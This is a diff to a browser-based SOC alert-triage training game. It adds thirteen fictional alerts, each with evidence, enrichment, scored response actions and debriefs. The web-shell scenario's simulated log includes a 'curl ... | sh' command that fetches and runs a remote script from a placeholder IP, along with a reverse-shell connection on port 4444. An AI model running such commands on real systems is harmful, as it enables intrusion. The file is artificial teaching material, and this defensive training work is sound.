@@ -224,7 +224,7 @@ header.bar{
   <div class="start-card">
     <div class="pulse"><span class="dot"></span> SHIFT 03 · 22:00–06:00 · QUEUE LIVE</div>
     <h1 class="brand">Nightwatch<em>Alert triage practice for first-line SOC analysts</em></h1>
-    <p class="lede">Ten alerts are waiting. Read the evidence, decide what is really happening, and take only the response actions the situation deserves. You get scored on every one.</p>
+    <p class="lede">Twenty-three alerts are waiting. Read the evidence, decide what is really happening, and take only the response actions the situation deserves. You get scored on every one.</p>
 
     <label class="field" for="nameInput"><span>What should the console call you?</span>
       <input id="nameInput" type="text" placeholder="e.g. Petra N." autocomplete="off" maxlength="24">
@@ -264,7 +264,7 @@ header.bar{
 
   <div class="wrap">
     <div class="strip">
-      <div class="stat"><b id="sClosed">0/10</b><span>Cases closed</span></div>
+      <div class="stat"><b id="sClosed">0/23</b><span>Cases closed</span></div>
       <div class="stat"><b id="sAcc">—</b><span>Verdict accuracy</span></div>
       <div class="stat hot"><b id="sStreak">0</b><span>Streak</span></div>
       <div class="stat"><b id="sScore">0</b><span>Score</span></div>
@@ -389,6 +389,32 @@ const ALERTS = [
   debrief:'Account takeover, not host compromise — so isolating the laptop achieves nothing. A password reset alone is not enough either: without revoking sessions and tokens the attacker keeps their stolen session. Reset, revoke, block the domain, and go hunting for that inbox rule.'
 },
 {
+  id:'ALT-4481', sev:'critical', target:150,
+  title:'Web shell dropped on the public marketing site',
+  source:'File integrity monitoring · Web server', time:'23:52',
+  entities:{ Host:'WEB-EXT-03', Path:'/wp-content/uploads/2026/tmp.php' },
+  summary:'A PHP web shell appeared in the uploads directory minutes after a critical unauthenticated file-upload flaw was disclosed for the site’s form plugin. Commands are already being executed through it.',
+  evidence:[
+    ['23:47:02','POST /wp-content/uploads/2026/tmp.php?cmd=whoami — 200 OK'],
+    ['23:47:03','Response body: www-data'],
+    ['23:49:18','tmp.php spawned /bin/sh -c "curl http://45.9.x.x/x.sh | sh"'],
+    ['23:51:40','Outbound connection to 45.9.x.x:4444 established']
+  ],
+  enrich:[
+    { id:'e1', label:'Check what the shell has executed', cost:20, key:true,
+      result:'The operator has already run a reverse-shell payload and opened an interactive connection on port 4444.' },
+    { id:'e2', label:'Check the vulnerable plugin', cost:20,
+      result:'The site runs a form plugin with a critical unauthenticated file-upload flaw disclosed six hours ago, still unpatched.' },
+    { id:'e3', label:'Check for other affected hosts', cost:20,
+      result:'Two other web servers behind the same load balancer run the identical vulnerable plugin version.' }
+  ],
+  verdict:'true_positive',
+  required:['isolate_host','quarantine_file','collect_forensics'],
+  ok:['escalate_ir','block_indicator','add_watchlist'],
+  forbidden:['tune_rule','close_no_action','notify_user'],
+  debrief:'A live reverse shell, not just a dropped file — pull the host off the network before the operator does anything else, quarantine the shell, and image it while the process is still resident. Patch or take down the plugin on the other two servers before this becomes three incidents instead of one.'
+},
+{
   id:'ALT-4473', sev:'high', target:130,
   title:'Impossible travel: Prague to Singapore in 22 minutes',
   source:'Identity protection · Risk detection', time:'00:07',
@@ -413,6 +439,32 @@ const ALERTS = [
   ok:['add_watchlist'],
   forbidden:['disable_account','reset_password','isolate_host','revoke_sessions','escalate_ir','notify_hr_legal'],
   debrief:'Same device, same session, corporate VPN egress in Singapore. Locking out an engineer at midnight over a geo-IP artifact is a real cost to the business — and the rule needs a VPN exclusion so the next analyst does not lose twenty minutes on it too.'
+},
+{
+  id:'ALT-4491', sev:'medium', target:110,
+  title:'Backup agent triggers the ransomware behavioural heuristic',
+  source:'EDR · Behavioural detection', time:'00:35',
+  entities:{ Host:'FS01-BACKUP', Process:'veeam_agent.exe', Files:'38,412 read in 4 min' },
+  summary:'The EDR’s ransomware heuristic fired on a file server after a process read and rewrote tens of thousands of files in minutes — the same shape as mass encryption, but the timing lines up exactly with the nightly backup job.',
+  evidence:[
+    ['00:31:02','veeam_agent.exe reads 38,412 files across \\\\fs01\\ in 4 minutes'],
+    ['00:31:02','No file extensions changed, no ransom-note artifacts written'],
+    ['00:31:05','Process is signed by the approved backup vendor certificate'],
+    ['00:35:00','Job matches the scheduled nightly backup window in the change calendar']
+  ],
+  enrich:[
+    { id:'e1', label:'Check whether file extensions changed', cost:20, key:true,
+      result:'Not a single file extension changed and no new files were created — content was read and a snapshot written to the backup repository, nothing was encrypted.' },
+    { id:'e2', label:'Check the process signature', cost:20,
+      result:'Signed by the same backup vendor certificate used on every other file server, matching known-good hashes.' },
+    { id:'e3', label:'Check the job schedule', cost:20,
+      result:'This exact host runs a full backup at 00:30 every night; the timing has never varied.' }
+  ],
+  verdict:'false_positive',
+  required:['tune_rule','close_no_action'],
+  ok:['add_watchlist'],
+  forbidden:['isolate_host','disable_account','escalate_ir','quarantine_file','collect_forensics','reset_password'],
+  debrief:'Mass file reads at high speed look identical to encryption to a heuristic that only counts I/O volume — the giveaway is that nothing was actually renamed or altered. Add the backup agent’s hash and schedule to the rule’s exclusions so tonight’s job doesn’t page someone every night this week.'
 },
 {
   id:'ALT-4474', sev:'medium', target:120,
@@ -441,6 +493,32 @@ const ALERTS = [
   debrief:'Malicious, but unsuccessful. Real activity with no impact is still a true positive — block the source, keep watching in case they rotate addresses, and resist disabling thousands of accounts that were never actually compromised.'
 },
 {
+  id:'ALT-4482', sev:'high', target:140,
+  title:'Mass Kerberos ticket requests for every service account',
+  source:'Domain controller · Kerberos audit', time:'01:03',
+  entities:{ Host:'FIN-WS-031', User:'d.marek', Requests:'214 SPNs in 90s' },
+  summary:'A finance workstation requested Kerberos service tickets for 214 service accounts in under two minutes — far outside normal application behaviour, and consistent with an offline password-cracking setup.',
+  evidence:[
+    ['01:01:10','Event 4769 ×214: TGS requests for distinct SPNs from d.marek'],
+    ['01:01:10','All requests use RC4 encryption (weaker, crackable offline)'],
+    ['01:02:40','No corresponding application activity on FIN-WS-031'],
+    ['01:03:00','Three of the requested accounts hold local admin on domain servers']
+  ],
+  enrich:[
+    { id:'e1', label:'Check the encryption type requested', cost:20, key:true,
+      result:'Every ticket was requested with an RC4 downgrade even though AES is enabled domain-wide — the tickets are being harvested for offline cracking.' },
+    { id:'e2', label:'Check what d.marek was doing', cost:20,
+      result:'d.marek is a finance analyst with no reason to enumerate service accounts; the session shows no interactive keyboard activity, consistent with a scripted tool.' },
+    { id:'e3', label:'Check for prior similar bursts', cost:20,
+      result:'No SPN enumeration like this has occurred on this account or workstation before.' }
+  ],
+  verdict:'true_positive',
+  required:['collect_forensics','escalate_ir','reset_password'],
+  ok:['disable_account','isolate_host','add_watchlist'],
+  forbidden:['tune_rule','close_no_action','notify_user'],
+  debrief:'This is Kerberoasting — cheap to run and devastating if even one of those service accounts has a weak password. Reset the credentials for the harvested accounts, preserve the ticket-request logs, and get IR involved before someone finishes cracking one offline.'
+},
+{
   id:'ALT-4475', sev:'high', target:140,
   title:'MFA push flood on a director’s account',
   source:'Identity protection · MFA telemetry', time:'01:26',
@@ -465,6 +543,32 @@ const ALERTS = [
   ok:['disable_account','add_watchlist','escalate_ir','block_indicator'],
   forbidden:['tune_rule','close_no_action','isolate_host'],
   debrief:'The credential was already stolen; the flood was only about the second factor. Revoke sessions, reset the password, and remove that rogue authenticator — and talk to the user, because "approve to make it stop" is the pattern you want to break tenant-wide.'
+},
+{
+  id:'ALT-4483', sev:'medium', target:120,
+  title:'Cloud storage bucket left publicly readable',
+  source:'CSPM · Cloud configuration scan', time:'01:47',
+  entities:{ Bucket:'corp-backups-prod', Change:'ACL → public-read', Owner:'platform-team' },
+  summary:'A nightly configuration scan found the production backups bucket set to public-read. Access logs show downloads from outside the corporate IP ranges before the misconfiguration was caught.',
+  evidence:[
+    ['01:40:00','CSPM scan flags corp-backups-prod ACL changed to public-read'],
+    ['01:41:12','Bucket policy last modified 3 days ago via console by a platform engineer'],
+    ['01:44:30','Access log: 6 GET requests from 2 IPs outside any known corporate or vendor range'],
+    ['01:46:55','Objects downloaded include a database snapshot from last week']
+  ],
+  enrich:[
+    { id:'e1', label:'Check what was actually downloaded', cost:20, key:true,
+      result:'One of the external downloads pulled a full database snapshot containing customer records — this was not just a drive-by scanner.' },
+    { id:'e2', label:'Check how long it was exposed', cost:20,
+      result:'The bucket has been public for three days, since a change intended for a different, non-production bucket.' },
+    { id:'e3', label:'Check for a related change ticket', cost:20,
+      result:'The change ticket references a different bucket name — this one was edited by mistake.' }
+  ],
+  verdict:'true_positive',
+  required:['collect_forensics','escalate_ir','block_indicator'],
+  ok:['add_watchlist','notify_user'],
+  forbidden:['isolate_host','disable_account','reset_password','tune_rule','close_no_action','notify_hr_legal'],
+  debrief:'A misconfiguration is still a breach once someone outside the company actually pulls customer data. Lock down the exposure, preserve the access logs before they roll off, and escalate — this is now an incident with a real download, not a config finding to close quietly.'
 },
 {
   id:'ALT-4476', sev:'high', target:160,
@@ -493,6 +597,32 @@ const ALERTS = [
   debrief:'Insider cases are evidence cases. Preserve first, then hand it to HR and legal, who own what happens next — and do not contact the employee. A warning tips them off and destroys both the evidence and any chance of a clean process.'
 },
 {
+  id:'ALT-4484', sev:'low', target:100,
+  title:'Aggressive scanning traffic against the customer portal',
+  source:'IDS · Network signature match', time:'02:15',
+  entities:{ Src:'198.51.100.44', Target:'portal.corp.example', Signatures:'40+ unique' },
+  summary:'A single external IP triggered dozens of IDS signatures — SQL injection probes, directory brute force, header fuzzing — against the customer portal in a tight, methodical pattern.',
+  evidence:[
+    ['02:10:00','IDS: 40+ distinct attack signatures from 198.51.100.44 in 5 minutes'],
+    ['02:11:20','Requests include SQLi probes, path traversal attempts, and a full directory brute force'],
+    ['02:12:00','User-Agent consistently identifies as a known commercial scanning tool'],
+    ['02:13:45','Zero requests resulted in a response above HTTP 403']
+  ],
+  enrich:[
+    { id:'e1', label:'Check the vendor scanning schedule', cost:20, key:true,
+      result:'The source IP matches the range provided for this quarter’s authorised penetration test, which started this morning and runs through Friday.' },
+    { id:'e2', label:'Check whether anything actually succeeded', cost:20,
+      result:'The WAF blocked every probe with a 403; nothing reached the application layer.' },
+    { id:'e3', label:'Check the engagement paperwork', cost:20,
+      result:'A signed statement of work and IP allowlist request are on file with the security team.' }
+  ],
+  verdict:'benign',
+  required:['close_no_action','add_watchlist'],
+  ok:['notify_user'],
+  forbidden:['isolate_host','disable_account','block_indicator','escalate_ir','reset_password','tune_rule'],
+  debrief:'Textbook authorised pentest traffic — everything about the pattern says attacker, but the paperwork says otherwise. Don’t block the vendor’s IP or you’ll be explaining to the account team why their engagement stalled; just keep an eye on it in case anything unexpected strays out of scope.'
+},
+{
   id:'ALT-4477', sev:'medium', target:110,
   title:'Hacking tool detected on an IT admin laptop',
   source:'Antivirus · Signature match HackTool/Mimikatz', time:'02:41',
@@ -517,6 +647,32 @@ const ALERTS = [
   ok:['notify_user','add_watchlist'],
   forbidden:['isolate_host','disable_account','escalate_ir','notify_hr_legal','reset_password'],
   debrief:'The tool is genuinely malicious software — the detection was correct, so this is not a false positive. It is authorised activity, which is a different call: verify the exception, document it, and scope the rule to the pentest device group.'
+},
+{
+  id:'ALT-4485', sev:'high', target:140,
+  title:'Malicious OAuth application granted full mailbox access',
+  source:'Cloud identity · OAuth app audit', time:'02:58',
+  entities:{ User:'z.novak', App:'"Quick PDF Convert"', Scope:'Mail.ReadWrite, Mail.Send' },
+  summary:'A user approved a third-party OAuth application after clicking a "convert your PDF" prompt. The app was granted full read/write and send access to the mailbox and has not stopped calling the API since.',
+  evidence:[
+    ['02:50:11','User consent granted to app "Quick PDF Convert" (publisher unverified)'],
+    ['02:50:40','App registered 5 days ago, requests Mail.ReadWrite and Mail.Send scopes'],
+    ['02:52:00','API calls to Microsoft Graph every 90 seconds since consent, reading mail'],
+    ['02:57:30','Outbound email sent via the API to 40 external addresses, not visible in Sent Items']
+  ],
+  enrich:[
+    { id:'e1', label:'Check what the app has done with the access', cost:20, key:true,
+      result:'It has been silently pulling mail and just sent a phishing message to 40 external contacts through the API, bypassing the Sent folder.' },
+    { id:'e2', label:'Check the app’s publisher and history', cost:20,
+      result:'Unverified publisher, registered five days ago, no other tenants have approved it.' },
+    { id:'e3', label:'Call the user', cost:30,
+      result:'z.novak remembers approving a permissions prompt while trying to convert a PDF from a link in a text message.' }
+  ],
+  verdict:'true_positive',
+  required:['revoke_sessions','block_indicator','notify_user'],
+  ok:['reset_password','add_watchlist','escalate_ir'],
+  forbidden:['isolate_host','tune_rule','close_no_action','notify_hr_legal'],
+  debrief:'The password was never needed — OAuth consent handed the attacker durable API access to the mailbox, which a password reset alone would not touch. Revoke the app’s grant and sessions, block it from being consented to again, and warn the 40 people who just received mail from a compromised, trusted account.'
 },
 {
   id:'ALT-4478', sev:'critical', target:160,
@@ -545,6 +701,58 @@ const ALERTS = [
   debrief:'Active command-and-control with the operator already enumerating privileged groups. Isolate before they move laterally, cut the C2 at the edge, preserve memory while the implant is still resident, and escalate — this is an incident, not a ticket.'
 },
 {
+  id:'ALT-4486', sev:'critical', target:150,
+  title:'Cryptomining process pegging CPU on a production database server',
+  source:'EDR · Resource & process anomaly', time:'03:41',
+  entities:{ Host:'DB-PROD-07', Process:'kswapd0 (masquerading)', CPU:'100% sustained' },
+  summary:'A process disguised with a kernel-thread name has pinned every core on a production database server for two hours, and is connecting outbound to a mining pool.',
+  evidence:[
+    ['03:22:05','Process "kswapd0" running from /tmp, not the kernel — genuine kswapd0 has no executable path'],
+    ['03:22:05','CPU utilisation 100% across all 16 cores since first observed'],
+    ['03:25:40','Outbound TLS connection to a known Monero mining pool domain'],
+    ['03:30:00','Database query latency up 6×, customer-facing timeouts logged']
+  ],
+  enrich:[
+    { id:'e1', label:'Check how the process got onto the host', cost:20, key:true,
+      result:'It was dropped through an exposed database management interface with a default credential still in place — patched two weeks ago on every host except this one.' },
+    { id:'e2', label:'Check the mining pool connection', cost:20,
+      result:'Confirmed Monero pool, actively submitting shares — this is generating revenue for whoever planted it, right now.' },
+    { id:'e3', label:'Check for lateral spread', cost:20,
+      result:'No other hosts on the segment show the same process or outbound pattern yet.' }
+  ],
+  verdict:'true_positive',
+  required:['isolate_host','quarantine_file','collect_forensics'],
+  ok:['escalate_ir','block_indicator','disable_account'],
+  forbidden:['close_no_action','tune_rule','notify_user'],
+  debrief:'A production database timing out for customers is the business impact; an unpatched management interface is the root cause. Isolate to stop both the mining and the timeouts, pull the binary, and get forensics before you rebuild — then make sure the patch that missed this host actually gets applied everywhere else.'
+},
+{
+  id:'ALT-4487', sev:'medium', target:110,
+  title:'Antivirus flags an internal automation script as a trojan',
+  source:'Antivirus · Heuristic detection', time:'04:05',
+  entities:{ Host:'SEC-AUTO-02', User:'svc-automation', File:'ticket_sync.py.exe' },
+  summary:'A PyInstaller-packaged internal ticketing script triggered a generic heuristic trojan signature the moment it was rebuilt and redeployed.',
+  evidence:[
+    ['04:00:10','AV signature match: Trojan.GenericKD.<hash> on ticket_sync.py.exe'],
+    ['04:00:10','File is code-signed with the internal engineering certificate'],
+    ['04:00:40','No network connections beyond the internal ticketing API'],
+    ['04:01:15','Identical heuristic hit logged for the previous build two releases ago, later confirmed clean']
+  ],
+  enrich:[
+    { id:'e1', label:'Check the code signature and hash history', cost:20, key:true,
+      result:'Signed with the internal cert, and the same generic heuristic has false-positived on the last three PyInstaller builds of this exact tool.' },
+    { id:'e2', label:'Check what the script actually does', cost:20,
+      result:'Source is in the internal repo — it only reads and writes tickets via the internal API, nothing resembling trojan behaviour.' },
+    { id:'e3', label:'Check the AV vendor’s detection notes', cost:20,
+      result:'The vendor’s generic heuristic is known to over-trigger on PyInstaller-packed Python binaries; a submission process exists for allowlisting.' }
+  ],
+  verdict:'false_positive',
+  required:['tune_rule','close_no_action'],
+  ok:['add_watchlist'],
+  forbidden:['isolate_host','disable_account','escalate_ir','quarantine_file','reset_password','notify_hr_legal'],
+  debrief:'Signed, internal, and a repeat offender against the same generic heuristic — this is the AV vendor’s packer problem, not an infection. Submit the hash for allowlisting so the next release doesn’t cost someone else the same twenty minutes.'
+},
+{
   id:'ALT-4479', sev:'critical', target:150,
   title:'Service account created a new domain administrator',
   source:'Active Directory · Audit log', time:'04:12',
@@ -571,6 +779,110 @@ const ALERTS = [
   debrief:'Someone has the service account credential and is building persistence. Disable the account they created, page IR, and preserve the domain controller logs. Killing svc-backup itself can take backups down, so that call belongs to IR and the platform owner together — knowing what your containment breaks is part of the job.'
 },
 {
+  id:'ALT-4492', sev:'high', target:130,
+  title:'Beacon pattern matches red-team infrastructure mid-purple-team exercise',
+  source:'Network detection · C2 beacon heuristic', time:'04:25',
+  entities:{ Host:'CORP-LT-118', User:'purple-ops', C2:'rt-infra-042[.]internal-test' },
+  summary:'A workstation began beaconing outbound every 45 seconds to a domain that matches the signature of commercial C2 frameworks — the same week the security team scheduled a purple team exercise.',
+  evidence:[
+    ['04:18:10','Outbound beacon every 45s ±2s to rt-infra-042[.]internal-test'],
+    ['04:18:10','JA3 fingerprint matches a known commercial red-team C2 framework'],
+    ['04:19:00','Host is enrolled in the AD group "SEC-PURPLETEAM-SCOPE"'],
+    ['04:20:15','No credential access or lateral movement attempts observed']
+  ],
+  enrich:[
+    { id:'e1', label:'Check the exercise rules of engagement', cost:20, key:true,
+      result:'The signed rules of engagement list this exact host and C2 domain as in-scope for the purple team exercise running this week, with a defined stop time.' },
+    { id:'e2', label:'Check who owns the workstation', cost:20,
+      result:'The device belongs to a member of the internal red team, logged in under their operational account.' },
+    { id:'e3', label:'Message the exercise coordinator', cost:30,
+      result:'The coordinator confirms the beacon is theirs and asks that detections log normally without triggering containment, per the plan.' }
+  ],
+  verdict:'benign',
+  required:['close_no_action','add_watchlist'],
+  ok:['notify_user'],
+  forbidden:['isolate_host','disable_account','escalate_ir','block_indicator','collect_forensics','reset_password'],
+  debrief:'The detection did exactly its job — this really does look like C2, because it is, just the authorised kind. Purple team week means checking the rules of engagement before you contain anything on the in-scope host list; log it, watch it, and save the real response for what falls outside scope.'
+},
+{
+  id:'ALT-4488', sev:'high', target:150,
+  title:'Terminated employee’s VPN and badge both used after their last day',
+  source:'Identity & physical access correlation', time:'04:47',
+  entities:{ User:'p.krejci', Terminated:'yesterday, 17:00', Access:'VPN + badge, 03:10' },
+  summary:'HR processed an involuntary termination yesterday evening. Overnight, the same credentials were used to connect to VPN and badge into the building, and files were accessed on a departmental share.',
+  evidence:[
+    ['17:00:00','HR system: p.krejci marked terminated, offboarding ticket opened'],
+    ['03:10:22','VPN authentication succeeded for p.krejci (account-disable step still open, unprocessed)'],
+    ['03:14:05','Badge swipe at the west entrance, floor 3'],
+    ['03:18:40','Access to \\\\fs02\\engineering\\roadmap — first access by this account in 4 months']
+  ],
+  enrich:[
+    { id:'e1', label:'Check the offboarding ticket status', cost:20, key:true,
+      result:'The account-disable step of the offboarding ticket was never completed — IT’s queue is backed up, and the credential was never actually revoked.' },
+    { id:'e2', label:'Check what was accessed', cost:20,
+      result:'The engineering roadmap share was opened and two documents were downloaded locally.' },
+    { id:'e3', label:'Check the badge log against building occupancy', cost:20,
+      result:'No one else swiped into that entrance in the surrounding hour — this matches the credential being used by the person who held it, not a shared or stolen badge.' }
+  ],
+  verdict:'true_positive',
+  required:['disable_account','revoke_sessions','collect_forensics'],
+  ok:['notify_hr_legal','escalate_ir','add_watchlist'],
+  forbidden:['close_no_action','tune_rule','notify_user'],
+  debrief:'A broken offboarding step, not a hacked account — but the access and the download are real and happened after termination. Cut the credential now, preserve what was accessed for HR and legal, and flag the gap in the offboarding process before the next departure slips through the same crack.'
+},
+{
+  id:'ALT-4489', sev:'low', target:100,
+  title:'Company-wide town hall invite quarantined as spam',
+  source:'Secure email gateway · Bulk mail filter', time:'05:12',
+  entities:{ Sender:'comms@corp.example', Recipients:'1,240', Action:'Quarantined' },
+  summary:'The gateway’s bulk-mail heuristics quarantined an internal town hall announcement sent to the whole company, flagging it for embedded tracking pixels and a high link-to-text ratio typical of marketing spam.',
+  evidence:[
+    ['05:08:00','Message from comms@corp.example to the all-staff distribution list'],
+    ['05:08:02','Gateway score: 8.4/10 spam — high link density, tracking pixel, bulk-send pattern'],
+    ['05:09:15','SPF, DKIM and DMARC all pass for the sending domain'],
+    ['05:10:00','Helpdesk ticket opened: "town hall invite never arrived"']
+  ],
+  enrich:[
+    { id:'e1', label:'Check the authentication results', cost:20, key:true,
+      result:'Fully authenticated, sent from the corporate comms platform everyone already recognises — the content just resembles marketing mail structurally.' },
+    { id:'e2', label:'Check who sent it', cost:20,
+      result:'Corporate communications confirms they sent it manually ten minutes ago via the approved mailing platform.' },
+    { id:'e3', label:'Check how often this platform gets flagged', cost:20,
+      result:'This is the fourth internal announcement from this platform quarantined by the same heuristic in two months.' }
+  ],
+  verdict:'false_positive',
+  required:['tune_rule','close_no_action'],
+  ok:['notify_user'],
+  forbidden:['block_indicator','disable_account','isolate_host','escalate_ir','notify_hr_legal','reset_password'],
+  debrief:'Authenticated, expected, and sent by the people who say they sent it — the bulk-mail heuristic just can’t tell a town hall invite from a newsletter. Release the quarantined copies and add an allow entry for the comms platform so this stops costing someone a ticket every few weeks.'
+},
+{
+  id:'ALT-4493', sev:'low', target:100,
+  title:'Remote access tool flagged as potentially unwanted software',
+  source:'Antivirus · PUA/RMM detection', time:'05:25',
+  entities:{ Host:'HR-WS-009', User:'it-helpdesk', Tool:'AnyDesk (ad.exe)' },
+  summary:'A remote-monitoring-and-management tool not on the standard software image was installed and used to connect to an employee’s workstation during a helpdesk ticket.',
+  evidence:[
+    ['05:20:02','AV: PUA.RemoteAdmin.AnyDesk flagged on HR-WS-009'],
+    ['05:20:02','Installed by domain account it-helpdesk, matches open ticket #48213'],
+    ['05:20:40','Remote session lasted 11 minutes, ended normally'],
+    ['05:21:00','No file transfer or credential-prompt activity logged during the session']
+  ],
+  enrich:[
+    { id:'e1', label:'Check the helpdesk ticket', cost:20, key:true,
+      result:'Ticket #48213 is open for a printer-driver issue on this exact workstation, assigned to the technician who ran the session.' },
+    { id:'e2', label:'Check whether this RMM tool is approved', cost:20,
+      result:'It’s not the standard corporate tool, but it is on the approved-alternatives list for this specific helpdesk queue.' },
+    { id:'e3', label:'Check session content for anything unusual', cost:20,
+      result:'Screen-recording metadata shows only driver-reinstall steps, nothing resembling data access.' }
+  ],
+  verdict:'benign',
+  required:['close_no_action','tune_rule'],
+  ok:['add_watchlist','notify_user'],
+  forbidden:['isolate_host','disable_account','escalate_ir','reset_password','notify_hr_legal'],
+  debrief:'Generic PUA signatures catch every remote-access tool, sanctioned or not — the open ticket and matching technician account are what separate this from a real RMM-based intrusion. Scope the detection rule to flag only RMM tools that aren’t on the approved list, so the helpdesk stops setting off the same alarm every shift.'
+},
+{
   id:'ALT-4480', sev:'low', target:100,
   title:'Phishing message reported by a user',
   source:'Report Phishing button · Mail gateway', time:'05:38',
@@ -595,6 +907,32 @@ const ALERTS = [
   ok:['add_watchlist','tune_rule','quarantine_file'],
   forbidden:['isolate_host','disable_account','reset_password','escalate_ir','notify_hr_legal','close_no_action'],
   debrief:'A quiet win. Block the domain, purge the other 23 copies, and reply to the reporter — people who get a thank-you report again, and reporting is the cheapest detection you own. No containment needed: nothing was clicked.'
+},
+{
+  id:'ALT-4490', sev:'critical', target:160,
+  title:'Internet-facing RDP compromised after a brute-force campaign',
+  source:'Firewall + EDR · Correlated detection', time:'05:55',
+  entities:{ Host:'JUMP-EXT-01', Src:'91.219.x.x', Attempts:'3,600 over 6 hours' },
+  summary:'A jump box was left reachable on RDP from the internet after a firewall rule change. After six hours of brute-forcing, one login succeeded, and the same session immediately began disabling security tooling.',
+  evidence:[
+    ['00:00:00','Firewall change window opens temporary RDP exposure for a since-completed migration'],
+    ['05:40:00','3,600 failed RDP logins from 91.219.x.x against local admin accounts'],
+    ['05:51:12','Login success: local administrator, from 91.219.x.x'],
+    ['05:53:30','Windows Defender and the EDR service both stopped from the same session']
+  ],
+  enrich:[
+    { id:'e1', label:'Check what happened right after the successful login', cost:20, key:true,
+      result:'The attacker immediately disabled both endpoint security agents — they are actively working to stay resident.' },
+    { id:'e2', label:'Check the firewall rule history', cost:20,
+      result:'The temporary exposure rule for the migration was never rolled back after the maintenance window closed four days ago.' },
+    { id:'e3', label:'Check for outbound activity since the compromise', cost:20,
+      result:'The host has started scanning the internal 10.0.0.0/16 range over SMB in the last two minutes.' }
+  ],
+  verdict:'true_positive',
+  required:['isolate_host','block_indicator','collect_forensics'],
+  ok:['escalate_ir','disable_account','reset_password','revoke_sessions'],
+  forbidden:['tune_rule','close_no_action','notify_user'],
+  debrief:'An attacker with local admin who just killed your endpoint defences and started scanning the internal network is already past the point of a quiet cleanup. Isolate immediately, close the exposed port at the firewall, and preserve what you can before they finish mapping the network — the four-day-old forgotten firewall rule is the after-action item.'
 }
 ];
 
